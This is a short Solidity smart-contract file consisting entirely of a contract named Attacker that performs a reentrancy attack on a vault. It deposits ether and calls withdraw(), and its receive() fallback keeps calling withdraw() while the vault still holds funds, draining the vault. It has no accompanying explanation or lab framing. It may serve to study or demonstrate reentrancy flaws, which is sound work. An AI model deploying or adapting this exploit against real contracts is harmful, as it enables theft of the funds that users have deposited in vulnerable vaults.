pragma solidity ^0.8.0;

interface IVault {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IVault public vault;
    uint256 public amount;

    constructor(address _vault) {
        vault = IVault(_vault);
    }

    function attack() external payable {
        amount = msg.value;
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= amount) {
            vault.withdraw();
        }
    }
}
